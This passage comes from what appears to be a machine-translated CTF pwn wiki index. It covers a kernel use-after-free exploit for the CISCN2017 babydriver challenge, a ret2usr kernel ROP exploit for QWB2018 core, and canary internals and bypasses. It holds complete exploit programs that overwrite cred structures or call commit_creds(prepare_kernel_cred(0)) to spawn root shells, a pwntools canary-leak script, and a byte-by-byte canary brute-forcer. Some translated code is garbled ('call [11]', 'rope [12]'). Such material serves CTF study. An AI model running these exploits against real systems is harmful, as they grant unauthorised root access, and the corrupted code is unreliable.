\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 #! / Bin / sh 2 \u2502 3 \u2502 mount -t proc none /proc 4 \u2502 mount -t sysfs none /sys 5 \u2502 mount -t devtmpfs devtmpfs /dev 6 \u2502 chown root:root flag 7 \u2502 chmod 400 flag 8 \u2502 exec 0 </dev/console 9 \u2502 exec 1 >/dev/console 10 \u2502 exec 2 >/dev/console 11 \u2502 12 \u2502 insmod /lib/modules/4.4.72/babydriver.ko 13 \u2502 chmod 777 / dev / babydev 14 \u2502 echo -e \"\\nBoot took $( cut -d ' ' -f1 /proc/uptime ) seconds\\n\" 15 \u2502 setsid cttyhack setuidgid 1000 sh 16 \u2502 17 \u2502 umount /proc 18 \u2502 umount /sys 19 \u2502 poweroff -d 0 -f 20 \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 According to the content of init, the driver of babydriver.ko is loaded in 12 lines. According to the general routine of pwn, this is the vulnerable LKM. The other commands in init are common commands for linux and will not be explained. Take this driver file out. core [ master\u25cf ] cp ./lib/modules/4.4.72/babydriver.ko .. core [ master \u25cf ] cd .. CISCN2017_babydriver [ master\u25cf ] check ./babydriver.ko ./babydriver.ko: ELF 64 -bit LSB relocatable, x86-64, version 1 ( SYSV ) , BuildID [ sha1 ]= 8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped [ * ] '/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled FOOT: No FOOT ( 0x0 ) No PIE, no canary protection, no symbol table removed, very nice. Open the analysis with IDA. Since the symbol table is not removed, shift + F9 first looks at what structure, you can find the following structure: ` asm 00000000 babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429) 00000000 ; XREF: .bss:babydev_struct/r 00000000 device_buf dq ? ; XREF: babyrelease+6/r 00000000 ; babyopen+26/w ... ; offset 00000008 device_buf_len dq ? ; XREF: babyopen+2D/w 00000008; babyioctl + 3C / w ... 00000010 babydevice_t ends 00000010 Look at the main function **babyioctl:** Defines the 0x10001 command, you can release the device\\_buf in the global variable babydev\\_struct, and then reapply a block of memory according to the size passed by the user, and set device\\_buf\\_len. ```C // local variable allocation has failed, the output may be wrong! void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg) { size_t v3; // rdx size_t v4; // rbx __int64 v5; // rdx _fentry__(filp, *(_QWORD *)&command); v4 = v3; if ( command == 0x10001 ) { kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL); babydev_struct.device_buf_len = v4; printk(\"alloc done\\n\", 0x24000C0LL, v5); } else { printk(\"\\x013defalut:arg is %ld\\n\", v3, v3); } } babyopen: Apply for a space of 0x40 bytes, the address is stored in the global variable babydev_struct.device_buf, and update babydev_struct.device_buf_len int __fastcall babyopen ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); babydev_struct . device_buf = ( char * ) kmem_cache_alloc_trace ( kmalloc_caches [ 6 ], 0x24000C0LL , 0x40LL ); babydev_struct . device_buf_len = 64L L ; printk ( \"device open \\n \" , 0x24000C0LL , v2 ); return 0 ; } babyread: First check if the length is less than babydev_struct.device_buf_len, then copy the data in babydev_struct.device_buf to the buffer, the buffer and the length are the parameters passed by the user. void __fastcall babyread ( file * filp , char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx _fentry__ ( filp , buffer ); if ( babydev_struct . device_buf ) { if ( babydev_struct . device_buf_len > v4 ) copy_to_user ( buffer , babydev_struct . device_buf , v4 ); } } babywrite: Similar to babyread, the difference is from the buffer copy to the global variable void __fastcall babywrite ( file * filp , const char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx _fentry__ ( filp , buffer ); if ( babydev_struct . device_buf ) { if ( babydev_struct . device_buf_len > v4 ) copy_from_user ( babydev_struct . device_buf , buffer , v4 ); } } babyrelease: free up space, nothing to say int __fastcall babyrelease ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); kfree ( babydev_struct . device_buf ); printk ( \"device release \\n \" , filp , v2 ); return 0 ; } There are also two functions, babydriver_init() and babydriver_exit(), which complete the initialization and cleanup of the /dev/babydev device respectively. Check the usage of the function and no longer analyze it.","title":"Analysis"},{"location":"pwn/linux/kernel/kernel_uaf/#ideas","text":"There are no vulnerabilities such as user-space traditional overflow, but there is a UAF vulnerability caused by pseudo-conditional competition. This means that if we open both devices at the same time, the second time will overwrite the first allocated space, because babydev_struct is global. Similarly, if the first one is released, then the second one is actually released, which results in a UAF. So how do you use UAF? As mentioned before, the cred structure can be modified to grant root to root. The 4.7.22 cred structure [definition] ( https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118 ) is as follows: struct cred { atomic_t usage ; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers ; /* number of processes subscribed */ void * put_addr ; unsigned magic ; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid ; /* real UID of the task */ kgid_t gid ; /* real GID of the task */ kuid_t suid ; /* saved UID of the task */ kgid_t sgid ; /* saved GID of the task */ kuid_t euid ; /* effective UID of the task */ kgid_t egid ; /* effective GID of the task */ but_t fsuid ; / * UID for VFS ops * / kgid_t fsgid ; /* GID for VFS ops */ unsigned securebits ; /* SUID-less security management */ kernel_cap_t cap_inheritable ; /* caps our children can inherit */ kernel_cap_t cap_permitted ; /* caps we're permitted */ kernel_cap_t cap_effective ; /* caps we can actually use */ kernel_cap_t cap_bset ; /* capability bounding set */ kernel_cap_t cap_ambient ; /* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char jit_keyring ; /* default keyring to attach requested * keys to */ struct key __rcu * session_keyring ; /* keyring inherited over fork */ struct key * process_keyring ; /* keyring private to this process */ struct key * thread_keyring ; /* keyring private to this thread */ struct key * request_key_auth ; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void * security ; /* subjective LSM security */ #endif struct user_struct * user ; /* real user ID subscription */ struct user_namespace * user_ns ; /* user_ns the caps and keyrings are relative to. */ struct group_info * group_info ; /* supplementary groups for euid/fsgid */ struct rcu_head rcu ; /* RCU deletion hook */ }; Then according to the UAF's thinking, the idea is as follows: Turn on the device twice and change its size to the size of the cred structure via ioctl Release one, fork a new process, then the space of the cred of this new process will overlap with the previously released space At the same time, we can write to this space through another file descriptor, just need to change uid, gid to 0, that is, you can achieve the right to root Need to determine the size of the cred structure, with the source code, the size is well defined. The calculation is 0xa8 (note the source code using the same kernel version).","title":"Ideas"},{"location":"pwn/linux/kernel/kernel_uaf/#exploit","text":"The comments are written in the code, exploit here CISCN2017_babydriver [ master \u25cf\u25cf ] cat exploit . c #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <fcntl.h> #include <stropts.h> #include <sys/wait.h> #include <sys/stat.h> int main () { // Open the device twice int fd1 = open ( \"/dev/babydev\" , 2 ); int fd2 = open ( \"/dev/babydev\" , 2 ); // Modify babydev_struct.device_buf_len to sizeof(struct cred) ioctl ( fd1 , 0x10001 , 0xa8 ); // release fd1 close ( fd1 ); // The cred space of the new process will overlap with the babydev_struct just released int pid = fork (); if ( pid < 0 ) { puts ( \"[*] fork error!\" ); exit ( 0 ); } else if ( pid == 0 ) { // Modify the uid of the cred of the new process by changing fd2, the value of gid is 0. char zeros [ 30 ] = { 0 }; write ( fd2 , zeros , 28 ); if ( getuid () == 0 ) { puts ( \"[+] root now.\" ); system ( \"/bin/sh\" ); exit ( 0 ); } } else { wait ( NULL ); } close ( fd2 ); return 0 ; }","title":"Exploit"},{"location":"pwn/linux/kernel/kernel_uaf/#get-root-shell","text":"// statically compile the file, there is no libc in the kernel CISCN2017_babydriver [ master\u25cf\u25cf ] gcc exploit.c -static -o exploit CISCN2017_babydriver [ master\u25cf\u25cf ] file exploit exploit: ELF 64 -bit LSB executable, x86-64, version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= 90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped // Repackage rootfs.cpio in the directory where the compiled exp is extracted. CISCN2017_babydriver [ master\u25cf\u25cf ] cp exploit core/tmp CISCN2017_babydriver [ master\u25cf\u25cf ] cd core core [ master\u25cf\u25cf ] find . | cpio -o --format = newc > rootfs.cpio 7017 block core [ master\u25cf\u25cf ] cp rootfs.cpio .. core [ master \u25cf\u25cf ] cd .. // kvm requires root privileges CISCN2017_babydriver [ master\u25cf\u25cf ] sudo ./boot.sh ...... ...... / $ ls / tmp / exploit / $ id uid = 1000 ( ctf ) gid = 1000 ( ctf ) groups = 1000 ( ctf ) / $ /tmp/exploit [ 14 .376187 ] device open [ 14 .376715 ] device open [ 14 .377201 ] alloc done [ 14 .377629 ] device release [ + ] root now. / # id uid = 0 ( root ) gid = 0 ( root ) groups = 1000 ( ctf ) / # Of course, you can also use rop to do the next analysis.","title":"get root shell"},{"location":"pwn/linux/kernel/kernel_uaf/#reference","text":"https://bbs.pediy.com/thread-247054.htm https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html http://muhe.live/2017/07/13/babydriver-writeup/ https://www.anquanke.com/post/id/86490","title":"Reference:"},{"location":"pwn/linux/kernel/ret2usr/","text":"ret2usr \u00b6 The ret2usr attack exploits the user space of the user space to access the kernel space, but the kernel space can access the user space** This feature directs the kernel code or data stream to the user control, and performs the userspace code completion with the ring 0 privilege. Wait for the operation. 2018 \u5f3a\u7f51\u676f- core \u00b6 The previous article analyzed the use of [kernel rop] ( https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop/#kernel-rop-2018-core ) to complete the lifting of the shell. Step, this analysis uses the ret2usr method to get the root shell. The topic is no longer analyzed, directly analyzing exp. #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/stat.h> #include <fcntl.h> #include <string.h> #include <stdint.h> size_t user_cs , user_ss , user_rflags , user_sp ; void save_status () { __asm__ ( \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" & quot ; pushf ; & quot ; \"pop user_rflags;\" ); puts ( \"[*]status has been saved.\" ); } void get_shell ( void ){ system ( \"/bin/sh\" ); } size_t commit_creds = 0 , prepare_kernel_cred = 0 ; size_t raw_vmlinux_base = 0xffffffff81000000 ; size_t vmlinux_base = 0 ; size_t find_symbols () { FILE * kallsyms_fd = fopen ( \"/tmp/kallsyms\" , \"r\" ); /* FILE* kallsyms_fd = fopen(\"./test_kallsyms\", \"r\"); */ if ( kallsyms_fd < 0 ) { puts ( \"[*]open kallsyms error!\" ); exit ( 0 ); } char buf [ 0x30 ] = { 0 }; while ( fgets ( buf , 0x30 , kallsyms_fd )) { if ( commit_creds & prepare_kernel_cred ) return 0 ; if ( strstr ( buf , \"commit_creds\" ) && ! commit_creds ) { /* puts(buf); */ char hex [ 20 ] = { 0 }; strncpy ( hex , buf , 16 ); /* printf(\"hex: %s\\n\", hex); */ sscanf ( hex , \"%llx\" , & commit_creds ); printf ( \"commit_creds addr: %p \\n \" , commit_creds ); vmlinux_base = commit_creds - 0x9c8e0 ; printf ( \"vmlinux_base addr: %p \\n \" , vmlinux_base ); } if ( strstr ( buf , \"prepare_kernel_cred\" ) && ! prepare_kernel_cred ) { /* puts(buf); */ char hex [ 20 ] = { 0 }; strncpy ( hex , buf , 16 ); sscanf ( hex , \"%llx\" , & prepare_kernel_cred ); printf ( \"prepare_kernel_cred addr: %p \\n \" , prepare_kernel_cred ); vmlinux_base = prepare_kernel_cred - 0x9cce0 ; /* printf(\"vmlinux_base addr: %p\\n\", vmlinux_base); */ } } if ( ! ( prepare_kernel_cred & commit_creds )) { puts ( \"[*]Error!\" ); exit ( 0 ); } } void get_root () { char * ( * pkc ) ( int ) = prepare_kernel_cred ; void ( * cc )( char * ) = commit_creds ; ( * cc ) (( * pkc ) ( 0 )); /* puts(\"[*] root now.\"); */ } void set_off ( int fd , long long idx ) { printf ( \"[*]set off to %ld \\n \" , idx ); ioctl ( fd , 0x6677889C , idx ); } void core_read ( int fd , char * buf ) { puts ( \"[*]read to buf.\" ); ioctl ( fd , 0x6677889B , buf ); } void core_copy_func ( int fd , long long size ) { printf ( \"[*]copy from user with size: %ld \\n \" , size ); ioctl ( fd , 0x6677889A , size ); } int main ( void ) { find_symbols (); size_t offset = vmlinux_base - raw_vmlinux_base ; save_status (); int fd = open ( \"/proc/core\" , O_RDWR ); set_off ( fd , 0x40 ); size_t buf [ 0x40 / 8 ]; core_read ( fd , buf ); size_t canary = buf [ 0 ]; printf ( \"[*]canary : %p \\n \" , canary ); size_t rop [ 0x30 ] = { 0 }; rop [ 8 ] = canary ; rop [ 10 ] = ( size_t ) get_root ; call [ 11 ] = 0xffffffff81a012da + offset ; // swapgs; popfq; right rope [ 12 ] = 0 ; call [ 13 ] = 0xffffffff81050ac2 + offset ; // iretq; right; rop [ 14 ] = ( size_t ) get_shell ; rop [ 15 ] = user_cs ; rop [ 16 ] = user_rflags ; rop [ 17 ] = user_sp ; rop [ 18 ] = user_ss ; puts ( \"[*] DEBUG: \" ); getchar (); write ( fd , rop , 0x30 * 8 ); core_copy_func ( fd , 0xffffffffffff0000 | ( 0x100 )); } Compare the similarities and differences between [kernel rop] ( https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c ). Get commit_creds and prepare_kernel_cred by reading /tmp/kallsyms , and determine the address of the gadget based on these offsets. The method of leak canary is the same, and the canary is read by controlling the global variable off . Unlike the kernel rop approach, the construction of the rop chain The kernel rop reaches the execution of commit_creds(prepare_kernel_cred(0)) by the rop chain of the kernel space, and then returns to the user mode through swapgs; iretq , etc., and executes the system(&quot;/bin/ of the user space. Sh&quot;) Get the shell In the ret2usr approach, return directly to the user space constructor's commit_creds(prepare_kernel_cred(0)) (implemented by function pointer) to raise the weight. Although these two functions are in kernel space, we are ring 0 at this time. Privileges, so it works fine. Then also pass swapgs; iretq back to the user mode to execute the user space system(&quot;/bin/sh&quot;) A comparison of these two approaches can be seen as the reason for ret2usr because it is generally much simpler to construct a specific purpose code in user space than in kernel space.","title":"ret2usr"},{"location":"pwn/linux/kernel/ret2usr/#ret2usr","text":"The ret2usr attack exploits the user space of the user space to access the kernel space, but the kernel space can access the user space** This feature directs the kernel code or data stream to the user control, and performs the userspace code completion with the ring 0 privilege. Wait for the operation.","title":"ret2usr"},{"location":"pwn/linux/kernel/ret2usr/#2018-core","text":"The previous article analyzed the use of [kernel rop] ( https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop/#kernel-rop-2018-core ) to complete the lifting of the shell. Step, this analysis uses the ret2usr method to get the root shell. The topic is no longer analyzed, directly analyzing exp. #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/stat.h> #include <fcntl.h> #include <string.h> #include <stdint.h> size_t user_cs , user_ss , user_rflags , user_sp ; void save_status () { __asm__ ( \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" & quot ; pushf ; & quot ; \"pop user_rflags;\" ); puts ( \"[*]status has been saved.\" ); } void get_shell ( void ){ system ( \"/bin/sh\" ); } size_t commit_creds = 0 , prepare_kernel_cred = 0 ; size_t raw_vmlinux_base = 0xffffffff81000000 ; size_t vmlinux_base = 0 ; size_t find_symbols () { FILE * kallsyms_fd = fopen ( \"/tmp/kallsyms\" , \"r\" ); /* FILE* kallsyms_fd = fopen(\"./test_kallsyms\", \"r\"); */ if ( kallsyms_fd < 0 ) { puts ( \"[*]open kallsyms error!\" ); exit ( 0 ); } char buf [ 0x30 ] = { 0 }; while ( fgets ( buf , 0x30 , kallsyms_fd )) { if ( commit_creds & prepare_kernel_cred ) return 0 ; if ( strstr ( buf , \"commit_creds\" ) && ! commit_creds ) { /* puts(buf); */ char hex [ 20 ] = { 0 }; strncpy ( hex , buf , 16 ); /* printf(\"hex: %s\\n\", hex); */ sscanf ( hex , \"%llx\" , & commit_creds ); printf ( \"commit_creds addr: %p \\n \" , commit_creds ); vmlinux_base = commit_creds - 0x9c8e0 ; printf ( \"vmlinux_base addr: %p \\n \" , vmlinux_base ); } if ( strstr ( buf , \"prepare_kernel_cred\" ) && ! prepare_kernel_cred ) { /* puts(buf); */ char hex [ 20 ] = { 0 }; strncpy ( hex , buf , 16 ); sscanf ( hex , \"%llx\" , & prepare_kernel_cred ); printf ( \"prepare_kernel_cred addr: %p \\n \" , prepare_kernel_cred ); vmlinux_base = prepare_kernel_cred - 0x9cce0 ; /* printf(\"vmlinux_base addr: %p\\n\", vmlinux_base); */ } } if ( ! ( prepare_kernel_cred & commit_creds )) { puts ( \"[*]Error!\" ); exit ( 0 ); } } void get_root () { char * ( * pkc ) ( int ) = prepare_kernel_cred ; void ( * cc )( char * ) = commit_creds ; ( * cc ) (( * pkc ) ( 0 )); /* puts(\"[*] root now.\"); */ } void set_off ( int fd , long long idx ) { printf ( \"[*]set off to %ld \\n \" , idx ); ioctl ( fd , 0x6677889C , idx ); } void core_read ( int fd , char * buf ) { puts ( \"[*]read to buf.\" ); ioctl ( fd , 0x6677889B , buf ); } void core_copy_func ( int fd , long long size ) { printf ( \"[*]copy from user with size: %ld \\n \" , size ); ioctl ( fd , 0x6677889A , size ); } int main ( void ) { find_symbols (); size_t offset = vmlinux_base - raw_vmlinux_base ; save_status (); int fd = open ( \"/proc/core\" , O_RDWR ); set_off ( fd , 0x40 ); size_t buf [ 0x40 / 8 ]; core_read ( fd , buf ); size_t canary = buf [ 0 ]; printf ( \"[*]canary : %p \\n \" , canary ); size_t rop [ 0x30 ] = { 0 }; rop [ 8 ] = canary ; rop [ 10 ] = ( size_t ) get_root ; call [ 11 ] = 0xffffffff81a012da + offset ; // swapgs; popfq; right rope [ 12 ] = 0 ; call [ 13 ] = 0xffffffff81050ac2 + offset ; // iretq; right; rop [ 14 ] = ( size_t ) get_shell ; rop [ 15 ] = user_cs ; rop [ 16 ] = user_rflags ; rop [ 17 ] = user_sp ; rop [ 18 ] = user_ss ; puts ( \"[*] DEBUG: \" ); getchar (); write ( fd , rop , 0x30 * 8 ); core_copy_func ( fd , 0xffffffffffff0000 | ( 0x100 )); } Compare the similarities and differences between [kernel rop] ( https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c ). Get commit_creds and prepare_kernel_cred by reading /tmp/kallsyms , and determine the address of the gadget based on these offsets. The method of leak canary is the same, and the canary is read by controlling the global variable off . Unlike the kernel rop approach, the construction of the rop chain The kernel rop reaches the execution of commit_creds(prepare_kernel_cred(0)) by the rop chain of the kernel space, and then returns to the user mode through swapgs; iretq , etc., and executes the system(&quot;/bin/ of the user space. Sh&quot;) Get the shell In the ret2usr approach, return directly to the user space constructor's commit_creds(prepare_kernel_cred(0)) (implemented by function pointer) to raise the weight. Although these two functions are in kernel space, we are ring 0 at this time. Privileges, so it works fine. Then also pass swapgs; iretq back to the user mode to execute the user space system(&quot;/bin/sh&quot;) A comparison of these two approaches can be seen as the reason for ret2usr because it is generally much simpler to construct a specific purpose code in user space than in kernel space.","title":"2018 \u5f3a\u7f51\u676f- core"},{"location":"pwn/linux/mitigation/canary/","text":"Canary \u00b6 Introduction \u00b6 Attacks caused by stack overflows are very common and very old. A mitigation technique called canary has long appeared in glibc and has been the first line of defense for system security. Canary is simple and efficient in both implementation and design. It is to insert a value. At the end of the high-risk area where stack overflow occurs, when the function returns, check if the value of canary has been changed to determine whether stack/buffer overflow is occur. Canary and GS protection under Windows are effective means to mitigate stack overflow. Its appearance largely increases the difficulty of exploiting a stack buffer overflow, and since it hardly consumes system resources, it has become the standard of protection mechanism under Linux. Canary Principle \u00b6 Using Canary in GCC \u00b6 Canary can be set in GCC with the following parameters: -fstack-protector enables protection, but only inserts protection for functions that have arrays in local variables -fstack-protector-all Enable protection, insert protection for all functions -fstack-protector-strong -fstack-protector-explicit Only protects functions with explicit stack_protect attribute -fno-stack-protector Disable protection. Canary Implementation Principle \u00b6 The stack structure that enables Canary protection is as follows High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp => | old ebp | +-----------------+ rbp-8 => | canary value | +-----------------+ | Local variables | +-----------------+ Low | | Address When the program enables Canary compilation, the value at fs register 0x28 is taken in the prologue of the function and stored in the stack at %ebp-0x8. This operation is to insert the Canary value into the stack, the code is as follows: mov rax , qword ptr fs :[ 0x28 ] mov qword ptr [ rbp-8 ], rax This value is taken out before the function returns and XORed with the value of fs:0x28. If the result of the exclusive OR is 0, the canary is not modified, and the function returns normally. This operation is to detect whether a stack overflow occurs. mov rdx , QWORD PTR [ rbp-0x8 ] xor rdx , QWORD PTR fs : 0x28 je 0x4005d7 < main + 65 > call 0x400460 < __stack_chk_fail@plt > If the canary has been illegally modified, the program flow will go to __stack_chk_fail . __stack_chk_fail is also a function in glibc, which by default is delayed by ELF and is defined as follows. eglibc -2.19 / debug / stack_chk_fail . c void __attribute__ (( noreturn )) __stack_chk_fail ( void ) { __fortify_fail ( \"stack smashing detected\" ); } void __attribute__ (( noreturn )) internal_function __fortify_fail ( const char * msg ) { /* The loop is added only to keep gcc happy. */ while ( 1 ) __libc_message ( 2 , \"*** %s ***: %s terminated \\n \" , msg , __libc_argv [ 0 ] ?: \"<unknown>\" ); } This means that you can hijack the process by hijacking the __stack_chk_fail 's got value or leaking content with __stack_chk_fail (see stack smash). Further, for Linux, the fs register actually points to the TLS structure of the current stack, and fs:0x28 points to stack_guard. typedef struct { void * tcb ; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t * dtv ; void * self ; /* Pointer to the thread descriptor. */ int multiple_threads ; uintptr_t sysinfo ; uintptr_t stack_guard ; ... } tcbhead_t ; A bypass protection mechanism can be implemented if there is an overflow that overrides the Canary value stored in TLS. In fact, the value in TLS is initialized by the function security_init. static void security_init ( void ) { // The value of _dl_random is already written by the kernel when entering this function. // glibc directly uses the value of _dl_random and does not assign it // If you don&#39;t use this mode, glibc can also generate random numbers by itself. / / Set the last byte of _dl_random to 0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard ( _dl_random ); / / Set the value of Canary to TLS THREAD_SET_STACK_GUARD ( stack_chk_guard ); _dl_random = NULL ; } //THREAD_SET_STACK_GUARD macro is used to set TLS #define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value) Canary bypass technology \u00b6 Preface \u00b6 Canary is a very effective vulnerability mitigation for stack overflow issues. But it does not mean that Canary can block all stack overflow exploits. Here is a common stack overflow exploit that exists in Canary. Please note that each method has specific environment requirements. Canary leaks Canary \u00b6 Canary is designed to end in bytes \\x00 , which is meant to ensure that Canary can truncate strings. The idea of leaking Canary in the stack is to overwrite the low byte of Canary to print out the remaining Canary part. This type of utilization requires the existence of a suitable output function, and may require the first overflow to leak Canary, and then overflow the control execution flow again. Using examples \u00b6 The sample source code for the vulnerability is as follows: // ex2.c #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> void getshell ( void ) { system ( \"/bin/sh\" ); } void init () { setbuf ( stdin , NULL ); setbuf ( stdout , NULL ); setbuf ( stderr , NULL ); } void vuln () { char buf [ 100 ]; for ( int i = 0 ; i < 2 ; i ++ ){ read ( 0 , buf , 0x200 ); printf ( buf ); } } int main ( void ) { init (); puts ( \"Hello Hacker!\" ); vuln (); return 0 ; } Compile as 32bit program and disable PIE protection (NX, ASLR and Canary protection are invoked by default) $ gcc -m32 -no-pie ex2.c -o ex2 First print out the 4-digit Canary by overwriting the last \\x00 byte of Canary After that, calculate the offset, fill Canary into the corresponding overflow position, and implement Ret into the getshell function. #!/usr/bin/env python from pwn import * context . binary = 'ex2' #context.log_level = 'debug' io = process ( & #39;./ ex2&#39;) get_shell = ELF ( \"./ex2\" ) . sym [ \"getshell\" ] io . recvuntil ( & quot ; Hello Hacker ! # leak Canary payload = \"A\" * 100 io . sendline ( payload ) io . recvuntil ( & quot ; A & quot ; * 100 ) Canary = u32 ( io . recv ( 4 )) - 0xa log . info ( \"Canary:\" + hex ( Canary )) # Bypass Canary payload = \" \\x90 \" * 100 + p32 ( Canary ) + \" \\x90 \" * 12 + p32 ( get_shell ) io . send ( payload ) io . recv () io . interactive () one-by-one crack Canary \u00b6 For Canary, although the Canary is different each time the same process restarts (the same as GS, GS is restarted), but the Canary of each thread in the same process is identical. Also, there is a class that opens the child process interaction through the fork function, because the fork function directly copies the memory of the parent process, so the Canary of each child process created is the same. We can use this feature to completely blast Canary byte by byte. In the famous offset2libc bypassing all protected linux64bit articles, the author is using this way to blast the Canary: This is the Python code for blasting: print \"[+] Brute forcing stack canary \" start = len ( p ) stop = len ( p ) + 8 while len ( p ) < stop : for i in xrange ( 0 , 256 ): res = send2server ( p + chr ( i )) if res != \"\" : p = p + chr ( i ) #print \"\\t[+] Byte found 0x%02x\" % i break if i == 255 : print \"[-] Exploit failed\" sys . exit ( - 1 ) canary = p [ stop : start - 1 : - 1 ] . encode ( \"hex\" ) print \" [+] SSP value is 0x %s \" % canary Hijack __stack_chk_fail function \u00b6 The processing logic that knows that Canary fails will enter the __stack_chk_fail ed function. The __stack_chk_fail ed function is a normal delay binding function that can be hijacked by modifying the GOT table. See ZCTF2017 Login, using the GTS table of __stack_chk_fail by fsb vulnerability, and then using ROP Override the Canary value stored in TLS \u00b6 It is known that Canary is stored in TLS and will be compared using this value before the function returns. When the overflow size is large, it can overwrite the Canary and TLS stored Canary implementations stored on the stack at the same time. See StarCTF2018 babystack","title":"Canary"},{"location":"pwn/linux/mitigation/canary/#canary","text":"","title":"Canary"},{"location":"pwn/linux/mitigation/canary/#introduction","text":"Attacks caused by stack overflows are very common and very old. A mitigation technique called canary has long appeared in glibc and has been the first line of defense for system security. Canary is simple and efficient in both implementation and design. It is to insert a value. At the end of the high-risk area where stack overflow occurs, when the function returns, check if the value of canary has been changed to determine whether stack/buffer overflow is occur. Canary and GS protection under Windows are effective means to mitigate stack overflow. Its appearance largely increases the difficulty of exploiting a stack buffer overflow, and since it hardly consumes system resources, it has become the standard of protection mechanism under Linux.","title":"Introduction"},{"location":"pwn/linux/mitigation/canary/#canary-principle","text":"","title":"Canary Principle"},{"location":"pwn/linux/mitigation/canary/#using-canary-in-gcc","text":"Canary can be set in GCC with the following parameters: -fstack-protector enables protection, but only inserts protection for functions that have arrays in local variables -fstack-protector-all Enable protection, insert protection for all functions -fstack-protector-strong -fstack-protector-explicit Only protects functions with explicit stack_protect attribute -fno-stack-protector Disable protection.","title":"Using Canary in GCC"},{"location":"pwn/linux/mitigation/canary/#canary-implementation-principle","text":"The stack structure that enables Canary protection is as follows High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp => | old ebp | +-----------------+ rbp-8 => | canary value | +-----------------+ | Local variables | +-----------------+ Low | | Address When the program enables Canary compilation, the value at fs register 0x28 is taken in the prologue of the function and stored in the stack at %ebp-0x8. This operation is to insert the Canary value into the stack, the code is as follows: mov rax , qword ptr fs :[ 0x28 ] mov qword ptr [ rbp-8 ], rax This value is taken out before the function returns and XORed with the value of fs:0x28. If the result of the exclusive OR is 0, the canary is not modified, and the function returns normally. This operation is to detect whether a stack overflow occurs. mov rdx , QWORD PTR [ rbp-0x8 ] xor rdx , QWORD PTR fs : 0x28 je 0x4005d7 < main + 65 > call 0x400460 < __stack_chk_fail@plt > If the canary has been illegally modified, the program flow will go to __stack_chk_fail . __stack_chk_fail is also a function in glibc, which by default is delayed by ELF and is defined as follows. eglibc -2.19 / debug / stack_chk_fail . c void __attribute__ (( noreturn )) __stack_chk_fail ( void ) { __fortify_fail ( \"stack smashing detected\" ); } void __attribute__ (( noreturn )) internal_function __fortify_fail ( const char * msg ) { /* The loop is added only to keep gcc happy. */ while ( 1 ) __libc_message ( 2 , \"*** %s ***: %s terminated \\n \" , msg , __libc_argv [ 0 ] ?: \"<unknown>\" ); } This means that you can hijack the process by hijacking the __stack_chk_fail 's got value or leaking content with __stack_chk_fail (see stack smash). Further, for Linux, the fs register actually points to the TLS structure of the current stack, and fs:0x28 points to stack_guard. typedef struct { void * tcb ; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t * dtv ; void * self ; /* Pointer to the thread descriptor. */ int multiple_threads ; uintptr_t sysinfo ; uintptr_t stack_guard ; ... } tcbhead_t ; A bypass protection mechanism can be implemented if there is an overflow that overrides the Canary value stored in TLS. In fact, the value in TLS is initialized by the function security_init. static void security_init ( void ) { // The value of _dl_random is already written by the kernel when entering this function. // glibc directly uses the value of _dl_random and does not assign it // If you don&#39;t use this mode, glibc can also generate random numbers by itself. / / Set the last 